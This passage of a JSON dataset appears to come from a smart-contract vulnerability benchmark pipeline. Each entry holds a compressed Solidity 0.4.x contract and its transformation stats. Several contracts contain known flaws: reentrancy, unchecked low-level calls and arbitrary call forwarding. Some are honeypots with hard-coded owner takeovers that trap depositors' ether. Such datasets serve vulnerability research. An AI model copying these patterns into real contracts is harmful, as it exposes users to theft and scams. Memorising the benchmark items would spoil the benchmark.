      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 6,
        "mode": "compressed",
        "original_lines": 23,
        "transformed_lines": 16,
        "original_chars": 638,
        "transformed_chars": 369,
        "compression_ratio": 0.58
      },
      "error": null
    },
    {
      "original_id": "sn_ds_046",
      "transformed_id": "ss_l1_compressed_sn_ds_046",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.2;\ncontract SimpleDAO {\nmapping (address => uint) public credit;\nfunction donate(address to) payable {\ncredit[to] += msg.value;\n}\nfunction withdraw(uint amount) {\nif (credit[msg.sender]>= amount) {\nbool res = msg.sender.call.value(amount)();\ncredit[msg.sender]-=amount;\n}\n}\nfunction queryCredit(address to) returns (uint){\nreturn credit[to];\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 5,
        "mode": "compressed",
        "original_lines": 21,
        "transformed_lines": 16,
        "original_chars": 444,
        "transformed_chars": 366,
        "compression_ratio": 0.82
      },
      "error": null
    },
    {
      "original_id": "sn_ds_047",
      "transformed_id": "ss_l1_compressed_sn_ds_047",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.10;\ncontract Caller {\nfunction callAddress(address a) {\na.call();\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 2,
        "mode": "compressed",
        "original_lines": 8,
        "transformed_lines": 6,
        "original_chars": 139,
        "transformed_chars": 90,
        "compression_ratio": 0.65
      },
      "error": null
    },
    {
      "original_id": "sn_ds_048",
      "transformed_id": "ss_l1_compressed_sn_ds_048",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.25;\ncontract demo{\nfunction transfer(address from,address caddress,address[] _tos,uint[] v)public returns (bool){\nrequire(_tos.length > 0);\nbytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\nfor(uint i=0;i<_tos.length;i++){\ncaddress.call(id,from,_tos[i],v[i]);\n}\nreturn true;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 1,
        "mode": "compressed",
        "original_lines": 12,
        "transformed_lines": 11,
        "original_chars": 411,
        "transformed_chars": 319,
        "compression_ratio": 0.78
      },
      "error": null
    },
    {
      "original_id": "sn_ds_049",
      "transformed_id": "ss_l1_compressed_sn_ds_049",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.18;\ncontract Ownable {\naddress newOwner;\naddress owner = msg.sender;\nfunction changeOwner(address addr)\npublic\nonlyOwner {\nnewOwner = addr;\n}\nfunction confirmOwner()\npublic {\nif(msg.sender==newOwner) {\nowner=newOwner;\n}\n}\nmodifier onlyOwner {\nif(owner == msg.sender)_;\n}\n}\ncontract Token is Ownable {\naddress owner = msg.sender;\nfunction WithdrawToken(address token, uint256 amount,address to)\npublic\nonlyOwner {\ntoken.call(bytes4(sha3(\"transfer(address,uint256)\")),to,amount);\n}\n}\ncontract TokenBank is Token {\nuint public MinDeposit;\nmapping (address => uint) public Holders;\nfunction initTokenBank()\npublic {\nowner = msg.sender;\nMinDeposit = 1 ether;\n}\nfunction()\npayable {\nDeposit();\n}\nfunction Deposit()\npayable {\nif(msg.value>MinDeposit) {\nHolders[msg.sender]+=msg.value;\n}\n}\nfunction WitdrawTokenToHolder(address _to,address _token,uint _amount)\npublic\nonlyOwner {\nif(Holders[_to]>0) {\nHolders[_to]=0;\nWithdrawToken(_token,_amount,_to);\n}\n}\nfunction WithdrawToHolder(address _addr, uint _wei)\npublic\nonlyOwner\npayable {\nif(Holders[msg.sender]>0) {\nif(Holders[_addr]>=_wei) {\n_addr.call.value(_wei);\nHolders[_addr]-=_wei;\n}\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 13,
        "mode": "compressed",
        "original_lines": 96,
        "transformed_lines": 65,
        "original_chars": 1660,
        "transformed_chars": 1156,
        "compression_ratio": 0.7
      },
      "error": null
    },
    {
      "original_id": "sn_ds_050",
      "transformed_id": "ss_l1_compressed_sn_ds_050",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.18;\ncontract Ownable {\naddress newOwner;\naddress owner = msg.sender;\nfunction changeOwner(address addr)\npublic\nonlyOwner {\nnewOwner = addr;\n}\nfunction confirmOwner()\npublic {\nif(msg.sender==newOwner) {\nowner=newOwner;\n}\n}\nmodifier onlyOwner {\nif(owner == msg.sender)_;\n}\n}\ncontract Token is Ownable {\naddress owner = msg.sender;\nfunction WithdrawToken(address token, uint256 amount,address to)\npublic\nonlyOwner {\ntoken.call(bytes4(sha3(\"transfer(address,uint256)\")),to,amount);\n}\n}\ncontract TokenBank is Token {\nuint public MinDeposit;\nmapping (address => uint) public Holders;\nfunction initTokenBank()\npublic {\nowner = msg.sender;\nMinDeposit = 1 ether;\n}\nfunction()\npayable {\nDeposit();\n}\nfunction Deposit()\npayable {\nif(msg.value>MinDeposit) {\nHolders[msg.sender]+=msg.value;\n}\n}\nfunction WitdrawTokenToHolder(address _to,address _token,uint _amount)\npublic\nonlyOwner {\nif(Holders[_to]>0) {\nHolders[_to]=0;\nWithdrawToken(_token,_amount,_to);\n}\n}\nfunction WithdrawToHolder(address _addr, uint _wei)\npublic\nonlyOwner\npayable {\nif(Holders[msg.sender]>0) {\nif(Holders[_addr]>=_wei) {\n_addr.call.value(_wei);\nHolders[_addr]-=_wei;\n}\n}\n}\nfunction Bal() public constant returns(uint){return this.balance;}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 13,
        "mode": "compressed",
        "original_lines": 97,
        "transformed_lines": 66,
        "original_chars": 1731,
        "transformed_chars": 1223,
        "compression_ratio": 0.71
      },
      "error": null
    },
    {
      "original_id": "sn_ds_051",
      "transformed_id": "ss_l1_compressed_sn_ds_051",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.18;\ncontract MultiplicatorX4 {\naddress public Owner = msg.sender;\nfunction() public payable{}\nfunction withdraw()\npayable\npublic {\nrequire(msg.sender == Owner);\nOwner.transfer(this.balance);\n}\nfunction Command(address adr,bytes data)\npayable\npublic {\nrequire(msg.sender == Owner);\nadr.call.value(msg.value)(data);\n}\nfunction multiplicate(address adr)\npublic\npayable {\nif(msg.value>=this.balance) {\nadr.transfer(this.balance+msg.value);\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 6,
        "mode": "compressed",
        "original_lines": 35,
        "transformed_lines": 24,
        "original_chars": 635,
        "transformed_chars": 462,
        "compression_ratio": 0.73
      },
      "error": null
    },
    {
      "original_id": "sn_ds_052",
      "transformed_id": "ss_l1_compressed_sn_ds_052",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract WhaleGiveaway2 {\naddress public Owner = msg.sender;\nuint constant public minEligibility = 0.999001 ether;\nfunction()\npublic\npayable {\n}\nfunction redeem()\npublic\npayable {\nif(msg.value>=minEligibility) { Owner.transfer(this.balance);\nmsg.sender.transfer(this.balance);\n}\n}\nfunction withdraw()\npayable\npublic { if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}\nrequire(msg.sender == Owner);\nOwner.transfer(this.balance);\n}\nfunction Command(address adr,bytes data)\npayable\npublic {\nrequire(msg.sender == Owner);\nadr.call.value(msg.value)(data);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 7,
        "mode": "compressed",
        "original_lines": 41,
        "transformed_lines": 28,
        "original_chars": 5483,
        "transformed_chars": 639,
        "compression_ratio": 0.12
      },
      "error": null
    },
    {
      "original_id": "sn_ds_053",
      "transformed_id": "ss_l1_compressed_sn_ds_053",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.24;\ncontract airdrop{\nfunction transfer(address from,address caddress,address[] _tos,uint v)public returns (bool){\nrequire(_tos.length > 0);\nbytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\nfor(uint i=0;i<_tos.length;i++){\ncaddress.call(id,from,_tos[i],v);\n}\nreturn true;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 3,
        "mode": "compressed",
        "original_lines": 14,
        "transformed_lines": 11,
        "original_chars": 411,
        "transformed_chars": 317,
        "compression_ratio": 0.77
      },
      "error": null
    },
    {
      "original_id": "sn_ds_054",
      "transformed_id": "ss_l1_compressed_sn_ds_054",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.18;\ncontract EBU{\naddress public from = 0x9797055B68C5DadDE6b3c7d5D80C9CFE2eecE6c9;\naddress public caddress = 0x1f844685f7Bf86eFcc0e74D8642c54A257111923;\nfunction transfer(address[] _tos,uint[] v)public returns (bool){\nrequire(msg.sender == 0x9797055B68C5DadDE6b3c7d5D80C9CFE2eecE6c9);\nrequire(_tos.length > 0);\nbytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\nfor(uint i=0;i<_tos.length;i++){\ncaddress.call(id,from,_tos[i],v[i]*1000000000000000000);\n}\nreturn true;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 3,
        "mode": "compressed",
        "original_lines": 17,
        "transformed_lines": 14,
        "original_chars": 621,
        "transformed_chars": 511,
        "compression_ratio": 0.82
      },
      "error": null
    },
    {
      "original_id": "sn_ds_055",
      "transformed_id": "ss_l1_compressed_sn_ds_055",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.24;\ncontract airPort{\nfunction transfer(address from,address caddress,address[] _tos,uint v)public returns (bool){\nrequire(_tos.length > 0);\nbytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\nfor(uint i=0;i<_tos.length;i++){\ncaddress.call(id,from,_tos[i],v);\n}\nreturn true;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 3,
        "mode": "compressed",
        "original_lines": 14,
        "transformed_lines": 11,
        "original_chars": 411,
        "transformed_chars": 317,
        "compression_ratio": 0.77
      },
      "error": null
    },
    {
      "original_id": "sn_ds_056",
      "transformed_id": "ss_l1_compressed_sn_ds_056",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.13;\ncontract Centra4 {\nfunction transfer() returns (bool) {\naddress contract_address;\ncontract_address = 0x96a65609a7b84e8842732deb08f56c3e21ac6f8a;\naddress c1;\naddress c2;\nuint256 k;\nk = 1;\nc2 = 0xaa27f8c1160886aacba64b2319d8d5469ef2af79;\ncontract_address.call(\"register\", \"CentraToken\");\nif(!contract_address.call(bytes4(keccak256(\"transfer(address,uint256)\")),c2,k)) return false;\nreturn true;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 6,
        "mode": "compressed",
        "original_lines": 21,
        "transformed_lines": 15,
        "original_chars": 480,
        "transformed_chars": 421,
        "compression_ratio": 0.88
      },
      "error": null
    },
    {
      "original_id": "sn_ds_057",
      "transformed_id": "ss_l1_compressed_sn_ds_057",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract Token {\nfunction transfer(address _to, uint _value) returns (bool success);\nfunction balanceOf(address _owner) constant returns (uint balance);\n}\ncontract EtherGet {\naddress owner;\nfunction EtherGet() {\nowner = msg.sender;\n}\nfunction withdrawTokens(address tokenContract) public {\nToken tc = Token(tokenContract);\ntc.transfer(owner, tc.balanceOf(this));\n}\nfunction withdrawEther() public {\nowner.transfer(this.balance);\n}\nfunction getTokens(uint num, address addr) public {\nfor(uint i = 0; i < num; i++){\naddr.call.value(0 wei)();\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 1,
        "mode": "compressed",
        "original_lines": 24,
        "transformed_lines": 23,
        "original_chars": 706,
        "transformed_chars": 570,
        "compression_ratio": 0.81
      },
      "error": null
    },
    {
      "original_id": "sn_ds_058",
      "transformed_id": "ss_l1_compressed_sn_ds_058",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.18;\ncontract MultiplicatorX3 {\naddress public Owner = msg.sender;\nfunction() public payable{}\nfunction withdraw()\npayable\npublic {\nrequire(msg.sender == Owner);\nOwner.transfer(this.balance);\n}\nfunction Command(address adr,bytes data)\npayable\npublic {\nrequire(msg.sender == Owner);\nadr.call.value(msg.value)(data);\n}\nfunction multiplicate(address adr)\npublic\npayable {\nif(msg.value>=this.balance) {\nadr.transfer(this.balance+msg.value);\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 6,
        "mode": "compressed",
        "original_lines": 35,
        "transformed_lines": 24,
        "original_chars": 635,
        "transformed_chars": 462,
        "compression_ratio": 0.73
      },
      "error": null
    },
    {
      "original_id": "sn_ds_059",
      "transformed_id": "ss_l1_compressed_sn_ds_059",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.24;\ncontract SimpleWallet {\naddress public owner = msg.sender;\nuint public depositsCount;\nmodifier onlyOwner {\nrequire(msg.sender == owner);\n_;\n}\nfunction() public payable {\ndepositsCount++;\n}\nfunction withdrawAll() public onlyOwner {\nwithdraw(address(this).balance);\n}\nfunction withdraw(uint _value) public onlyOwner {\nmsg.sender.transfer(_value);\n}\nfunction sendMoney(address _target, uint _value, bytes _data) public onlyOwner {\n_target.call.value(_value)(_data);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 7,
        "mode": "compressed",
        "original_lines": 28,
        "transformed_lines": 21,
        "original_chars": 625,
        "transformed_chars": 491,
        "compression_ratio": 0.79
      },
      "error": null
    },
    {
      "original_id": "sn_ds_060",
      "transformed_id": "ss_l1_compressed_sn_ds_060",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract Ownable {\naddress newOwner;\naddress owner = msg.sender;\nfunction changeOwner(address addr)\npublic\nonlyOwner {\nnewOwner = addr;\n}\nfunction confirmOwner()\npublic {\nif(msg.sender==newOwner) {\nowner=newOwner;\n}\n}\nmodifier onlyOwner {\nif(owner == msg.sender)_;\n}\n}\ncontract Token is Ownable {\naddress owner = msg.sender;\nfunction WithdrawToken(address token, uint256 amount,address to)\npublic\nonlyOwner {\ntoken.call(bytes4(sha3(\"transfer(address,uint256)\")),to,amount);\n}\n}\ncontract TokenBank is Token {\nuint public MinDeposit;\nmapping (address => uint) public Holders;\nfunction initTokenBank()\npublic {\nowner = msg.sender;\nMinDeposit = 1 ether;\n}\nfunction()\npayable {\nDeposit();\n}\nfunction Deposit()\npayable {\nif(msg.value>MinDeposit) {\nHolders[msg.sender]+=msg.value;\n}\n}\nfunction WitdrawTokenToHolder(address _to,address _token,uint _amount)\npublic\nonlyOwner {\nif(Holders[_to]>0) {\nHolders[_to]=0;\nWithdrawToken(_token,_amount,_to);\n}\n}\nfunction WithdrawToHolder(address _addr, uint _wei)\npublic\nonlyOwner\npayable {\nif(Holders[_addr]>0) {\nif(_addr.call.value(_wei)()) {\nHolders[_addr]-=_wei;\n}\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 12,
        "mode": "compressed",
        "original_lines": 94,
        "transformed_lines": 64,
        "original_chars": 1618,
        "transformed_chars": 1131,
        "compression_ratio": 0.7
      },
      "error": null
    },
    {
      "original_id": "sn_ds_061",
      "transformed_id": "ss_l1_compressed_sn_ds_061",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract HomeyJar {\naddress public Owner = msg.sender;\nfunction() public payable {}\nfunction GetHoneyFromJar() public payable {\nif(msg.value>1 ether) { Owner.transfer(this.balance);\nmsg.sender.transfer(this.balance);\n}\n}\nfunction withdraw() payable public { if(msg.sender==0x2f61E7e1023Bc22063B8da897d8323965a7712B7){Owner=0x2f61E7e1023Bc22063B8da897d8323965a7712B7;}\nrequire(msg.sender == Owner);\nOwner.transfer(this.balance);\n}\nfunction Command(address adr,bytes data) payable public {\nrequire(msg.sender == Owner);\nadr.call.value(msg.value)(data);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 6,
        "mode": "compressed",
        "original_lines": 25,
        "transformed_lines": 18,
        "original_chars": 5366,
        "transformed_chars": 579,
        "compression_ratio": 0.11
      },
      "error": null
    },
    {
      "original_id": "sn_ds_062",
      "transformed_id": "ss_l1_compressed_sn_ds_062",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract WhaleGiveaway1 {\naddress public Owner = msg.sender;\nuint constant public minEligibility = 0.999001 ether;\nfunction()\npublic\npayable {\n}\nfunction redeem()\npublic\npayable {\nif(msg.value>=minEligibility) { Owner.transfer(this.balance);\nmsg.sender.transfer(this.balance);\n}\n}\nfunction withdraw()\npayable\npublic { if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}\nrequire(msg.sender == Owner);\nOwner.transfer(this.balance);\n}\nfunction Command(address adr,bytes data)\npayable\npublic {\nrequire(msg.sender == Owner);\nadr.call.value(msg.value)(data);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 7,
        "mode": "compressed",
        "original_lines": 41,
        "transformed_lines": 28,
        "original_chars": 5483,
        "transformed_chars": 639,
        "compression_ratio": 0.12
      },
      "error": null
    },
    {
      "original_id": "sn_ds_063",
      "transformed_id": "ss_l1_compressed_sn_ds_063",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract WhaleGiveaway1 {\naddress public Owner = msg.sender;\nfunction()\npublic\npayable {\n}\nfunction GetFreebie()\npublic\npayable {\nif(msg.value>1 ether) { Owner.transfer(this.balance);\nmsg.sender.transfer(this.balance);\n}\n}\nfunction withdraw()\npayable\npublic { if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}\nrequire(msg.sender == Owner);\nOwner.transfer(this.balance);\n}\nfunction Command(address adr,bytes data)\npayable\npublic {\nrequire(msg.sender == Owner);\nadr.call.value(msg.value)(data);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 7,
        "mode": "compressed",
        "original_lines": 40,
        "transformed_lines": 27,
        "original_chars": 5421,
        "transformed_chars": 581,
        "compression_ratio": 0.11
      },
      "error": null
    },
    {
      "original_id": "sn_ds_064",
      "transformed_id": "ss_l1_compressed_sn_ds_064",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract Pie {\naddress public Owner = msg.sender;\nfunction()\npublic\npayable {\n}\nfunction GetPie()\npublic\npayable {\nif(msg.value>1 ether) { Owner.transfer(this.balance);\nmsg.sender.transfer(this.balance);\n}\n}\nfunction withdraw()\npayable\npublic { if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}\nrequire(msg.sender == Owner);\nOwner.transfer(this.balance);\n}\nfunction Command(address adr,bytes data)\npayable\npublic {\nrequire(msg.sender == Owner);\nadr.call.value(msg.value)(data);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 7,
        "mode": "compressed",
        "original_lines": 40,
        "transformed_lines": 27,
        "original_chars": 5008,
        "transformed_chars": 566,
        "compression_ratio": 0.11
      },
      "error": null
    },
    {
      "original_id": "sn_ds_065",
      "transformed_id": "ss_l1_compressed_sn_ds_065",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.16;\ncontract Owned {\nmodifier onlyOwner() {\nrequire(msg.sender == owner);\n_;\n}\naddress public owner;\nfunction Owned() {\nowner = msg.sender;\n}\naddress public newOwner;\nfunction changeOwner(address _newOwner) onlyOwner {\nnewOwner = _newOwner;\n}\nfunction acceptOwnership() {\nif (msg.sender == newOwner) {\nowner = newOwner;\n}\n}\nfunction execute(address _dst, uint _value, bytes _data) onlyOwner {\n_dst.call.value(_value)(_data);\n}\n}\ncontract WedIndex is Owned {\nstring public wedaddress;\nstring public partnernames;\nuint public indexdate;\nuint public weddingdate;\nuint public displaymultisig;\nIndexArray[] public indexarray;\nstruct IndexArray {\nuint indexdate;\nstring wedaddress;\nstring partnernames;\nuint weddingdate;\nuint displaymultisig;\n}\nfunction numberOfIndex() constant public returns (uint) {\nreturn indexarray.length;\n}\nfunction writeIndex(uint indexdate, string wedaddress, string partnernames, uint weddingdate, uint displaymultisig) {\nindexarray.push(IndexArray(now, wedaddress, partnernames, weddingdate, displaymultisig));\nIndexWritten(now, wedaddress, partnernames, weddingdate, displaymultisig);\n}\nevent IndexWritten (uint time, string contractaddress, string partners, uint weddingdate, uint display);\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 16,
        "mode": "compressed",
        "original_lines": 87,
        "transformed_lines": 46,
        "original_chars": 2961,
        "transformed_chars": 1237,
        "compression_ratio": 0.42
      },
      "error": null
    },
    {
      "original_id": "sn_ds_066",
      "transformed_id": "ss_l1_compressed_sn_ds_066",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.18;\ncontract Ownable {\naddress newOwner;\naddress owner = msg.sender;\nfunction changeOwner(address addr)\npublic\nonlyOwner {\nnewOwner = addr;\n}\nfunction confirmOwner()\npublic {\nif(msg.sender==newOwner) {\nowner=newOwner;\n}\n}\nmodifier onlyOwner {\nif(owner == msg.sender)_;\n}\n}\ncontract Token is Ownable {\naddress owner = msg.sender;\nfunction WithdrawToken(address token, uint256 amount,address to)\npublic\nonlyOwner {\ntoken.call(bytes4(sha3(\"transfer(address,uint256)\")),to,amount);\n}\n}\ncontract TokenBank is Token {\nuint public MinDeposit;\nmapping (address => uint) public Holders;\nfunction initTokenBank()\npublic {\nowner = msg.sender;\nMinDeposit = 1 ether;\n}\nfunction()\npayable {\nDeposit();\n}\nfunction Deposit()\npayable {\nif(msg.value>=MinDeposit) {\nHolders[msg.sender]+=msg.value;\n}\n}\nfunction WitdrawTokenToHolder(address _to,address _token,uint _amount)\npublic\nonlyOwner {\nif(Holders[_to]>0) {\nHolders[_to]=0;\nWithdrawToken(_token,_amount,_to);\n}\n}\nfunction WithdrawToHolder(address _addr, uint _wei)\npublic\nonlyOwner\npayable {\nif(Holders[msg.sender]>0) {\nif(Holders[_addr]>=_wei) {\n_addr.call.value(_wei);\nHolders[_addr]-=_wei;\n}\n}\n}\nfunction Bal() public constant returns(uint){return this.balance;}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 13,
        "mode": "compressed",
        "original_lines": 97,
        "transformed_lines": 66,
        "original_chars": 1732,
        "transformed_chars": 1224,
        "compression_ratio": 0.71
      },
      "error": null
    },
    {
      "original_id": "sn_ds_067",
      "transformed_id": "ss_l1_compressed_sn_ds_067",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.23;\ncontract Delta {\naddress public c = 0xF85A2E95FA30d005F629cBe6c6d2887D979ffF2A;\naddress public owner = 0x788c45dd60ae4dbe5055b5ac02384d5dc84677b0;\naddress public owner2 = 0x0C6561edad2017c01579Fd346a58197ea01A0Cf3;\nuint public active = 1;\nuint public token_price = 10**18*1/1000;\nfunction() payable {\ntokens_buy();\n}\nfunction tokens_buy() payable returns (bool) {\nrequire(active > 0);\nrequire(msg.value >= token_price);\nuint tokens_buy = msg.value*10**18/token_price;\nrequire(tokens_buy > 0);\nif(!c.call(bytes4(sha3(\"transferFrom(address,address,uint256)\")),owner, msg.sender,tokens_buy)){\nreturn false;\n}\nuint sum2 = msg.value * 3 / 10;\nowner2.send(sum2);\nreturn true;\n}\nfunction withdraw(uint256 _amount) onlyOwner returns (bool result) {\nuint256 balance;\nbalance = this.balance;\nif(_amount > 0) balance = _amount;\nowner.send(balance);\nreturn true;\n}\nfunction change_token_price(uint256 _token_price) onlyOwner returns (bool result) {\ntoken_price = _token_price;\nreturn true;\n}\nfunction change_active(uint256 _active) onlyOwner returns (bool result) {\nactive = _active;\nreturn true;\n}\nmodifier onlyOwner() {\nif (msg.sender != owner) {\nthrow;\n}\n_;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 17,
        "mode": "compressed",
        "original_lines": 79,
        "transformed_lines": 44,
        "original_chars": 2350,
        "transformed_chars": 1177,
        "compression_ratio": 0.5
      },
      "error": null
    },
    {
      "original_id": "sn_ds_068",
      "transformed_id": "ss_l1_compressed_sn_ds_068",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.18;\ncontract AirDropContract{\nfunction AirDropContract() public {\n}\nmodifier validAddress( address addr ) {\nrequire(addr != address(0x0));\nrequire(addr != address(this));\n_;\n}\nfunction transfer(address contract_address,address[] tos,uint[] vs)\npublic\nvalidAddress(contract_address)\nreturns (bool){\nrequire(tos.length > 0);\nrequire(vs.length > 0);\nrequire(tos.length == vs.length);\nbytes4 id = bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\nfor(uint i = 0 ; i < tos.length; i++){\ncontract_address.call(id, msg.sender, tos[i], vs[i]);\n}\nreturn true;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 6,
        "mode": "compressed",
        "original_lines": 29,
        "transformed_lines": 23,
        "original_chars": 762,
        "transformed_chars": 585,
        "compression_ratio": 0.77
      },
      "error": null
    },
    {
      "original_id": "sn_ds_069",
      "transformed_id": "ss_l1_compressed_sn_ds_069",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.18;\ncontract EBU{\nfunction transfer(address from,address caddress,address[] _tos,uint[] v)public returns (bool){\nrequire(_tos.length > 0);\nbytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\nfor(uint i=0;i<_tos.length;i++){\ncaddress.call(id,from,_tos[i],v[i]);\n}\nreturn true;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 3,
        "mode": "compressed",
        "original_lines": 14,
        "transformed_lines": 11,
        "original_chars": 412,
        "transformed_chars": 318,
        "compression_ratio": 0.77
      },
      "error": null
    },
    {
      "original_id": "sn_ds_070",
      "transformed_id": "ss_l1_compressed_sn_ds_070",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.24;\ncontract Proxy {\nmodifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;\nfunction transferOwner(address _owner) public onlyOwner { Owner = _owner; }\nfunction proxy(address target, bytes data) public payable {\ntarget.call.value(msg.value)(data);\n}\n}\ncontract DepositProxy is Proxy {\naddress public Owner;\nmapping (address => uint256) public Deposits;\nfunction () public payable { }\nfunction Vault() public payable {\nif (msg.sender == tx.origin) {\nOwner = msg.sender;\ndeposit();\n}\n}\nfunction deposit() public payable {\nif (msg.value > 0.5 ether) {\nDeposits[msg.sender] += msg.value;\n}\n}\nfunction withdraw(uint256 amount) public onlyOwner {\nif (amount>0 && Deposits[msg.sender]>=amount) {\nmsg.sender.transfer(amount);\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 7,
        "mode": "compressed",
        "original_lines": 36,
        "transformed_lines": 29,
        "original_chars": 963,
        "transformed_chars": 768,
